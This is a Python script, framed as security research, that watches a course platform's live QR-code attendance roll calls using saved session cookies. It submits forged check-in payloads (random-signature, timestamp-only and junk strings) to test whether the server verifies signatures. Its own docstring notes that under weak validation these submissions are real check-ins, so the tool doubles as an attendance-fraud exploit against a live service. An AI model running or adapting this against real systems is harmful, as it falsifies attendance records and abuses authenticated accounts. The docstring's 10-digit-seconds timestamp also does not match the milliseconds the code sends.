#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
probe_forge.py —— 安全研究用：验证服务端到底校不校验二维码里的签名

背景：二维码载荷里的 `data` = `<10 位秒级时间戳><32 位 hex 签名>`。
如果服务端只做弱校验（只看格式/时间窗），那么本地编一个 data 就能签到，完全不需要看图。
本探针只在"确实有进行中的扫码签到"时动手，每个 rid 只试一次，三连：

    1) 现在的时间戳 + 32 位随机 hex   → 成功 = 服务端不校验签名
    2) 只有时间戳                     → 成功 = 几乎不校验
    3) 垃圾串                        → 成功 = 完全不校验

结果解读：
    · 1/2 返回 `invalid_create_time_hash`、3 返回 `invalid_qr_create_time`
      ⇒ 服务端分两层校验（先解析时间戳、再验签），签名带私有密钥，本地造不出来。
    · 任何一条 200 且 status=on_call ⇒ 存在弱校验，可以完全脱离"看图"。

用法：
    python tools/probe_forge.py --watch          # 常驻等一场活码（推荐）
    python tools/probe_forge.py --once --yes     # 现在就跑（需此刻已有活码）
    python tools/probe_forge.py --once --yes --rid 123456

⚠️ 变体 2/3 提交的是**伪造 data**：服务端若只做弱校验，这就是一次真签到。
   只想观察不想真签，就别加 --yes。
"""
from __future__ import annotations

import argparse
import os
import random
import string
import sys
import time

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import qr_api as Q

DEAD = {"finished", "expired", "cancelled", "canceled", "deleted"}
DONE_RIDS: set[str] = set()


def live_qr_rollcalls(c: Q.TronClient) -> list[dict]:
    out = []
    try:
        courses = (c.req("GET", "/api/user/recently-visited-courses").json() or {}).get(
            "visited_courses") or []
    except Exception:
        return out
    for course in courses:
        cid = course.get("id")
        r = c.req("GET", f"/api/courses/{cid}/modules/rollcalls")
        if r.status_code != 200:
            continue
        try:
            items = (r.json() or {}).get("rollcalls") or []
        except ValueError:
            continue
        for rc in items:
            if str(rc.get("status") or "").lower() in DEAD:
                continue
            if str(rc.get("source") or "").lower() != "qr":
                continue
            out.append({"rid": rc.get("id"), "course": course.get("name"),
                        "status": rc.get("status"), "title": rc.get("title")})
    return out


def fire(c: Q.TronClient, rid, data: str) -> tuple[int, str, str]:
    r = c.req("PUT", f"/api/rollcall/{rid}/answer_qr_rollcall",
              json={"data": data, "deviceId": c.device_id})
    try:
        j = r.json() or {}
    except ValueError:
        j = {}
    return (r.status_code, str(j.get("status") or ""),
            str(j.get("error_code") or j.get("message") or ""))


def probe(c: Q.TronClient, rid, assume_yes: bool) -> None:
    rnd = "".join(random.choice(string.hexdigits.lower()) for _ in range(32))
    now_ms = int(time.time() * 1000)
    variants = [
        ("1 时间戳+32位随机hex", f"{now_ms}{rnd}", "服务端没校验签名（只认格式/时间窗）"),
        ("2 仅时间戳", f"{now_ms}", "服务端几乎不校验 data"),
        ("3 垃圾串", "test", "服务端完全不校验 data"),
    ]
    print(f"\n--- rid={rid} 三连探针 ---")
    for label, data, meaning in variants:
        if not assume_yes:
            print(f"  [{label}] 干跑，跳过（加 --yes 才会真发）")
            continue
        code, status, err = fire(c, rid, data)
        print(f"  [{label}] HTTP {code} status={status or '-'} code={err or '-'}")
        if code == 200 and status in Q.OK_STATUS:
            print(f"  ⚠️ 成功！→ 结论: {meaning}；二维码可以完全脱离看图")
            return
        if code == 401:
            print("  → 会话失效，先重新登录")
            return
        time.sleep(1.2)
    print("  → 三条全灭：服务端严格校验签名；二维码只能靠'在有效期内拿到一张真码'")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--watch", action="store_true", help="常驻等活码")
    ap.add_argument("--once", action="store_true")
    ap.add_argument("--rid", default=None)
    ap.add_argument("--yes", action="store_true", help="真的提交（否则干跑）")
    ap.add_argument("--cookies", default=None)
    ap.add_argument("--interval", type=float, default=15)
    a = ap.parse_args()

    cf = a.cookies or (Q.cookie_files() or [None])[0]
    if not cf:
        print("没有 cookies*.json")
        return 2
    c = Q.TronClient(cf)
    me, name = c.me()
    print(f"账号 {name} ({me})  deviceId={c.device_id}")
    if not me:
        print("会话无效")
        return 2

    while True:
        targets = ([{"rid": a.rid, "course": "?", "status": "?", "title": ""}]
                   if a.rid else live_qr_rollcalls(c))
        fresh = [t for t in targets if str(t["rid"]) not in DONE_RIDS]
        if fresh:
            for t in fresh:
                print(f"\n活码: rid={t['rid']} {t['course']} {t['title'] or ''}")
                if c.my_status(t["rid"]) == "on_call_fine":
                    print("  已经签上了，跳过")
                    DONE_RIDS.add(str(t["rid"]))
                    continue
                probe(c, t["rid"], a.yes)
                DONE_RIDS.add(str(t["rid"]))
        else:
            print(f"[{time.strftime('%H:%M:%S')}] 没有进行中的扫码签到"
                  f"（已探 {len(DONE_RIDS)} 场）")
        if a.once or not a.watch:
            return 0
        time.sleep(a.interval)


if __name__ == "__main__":
    sys.exit(main())
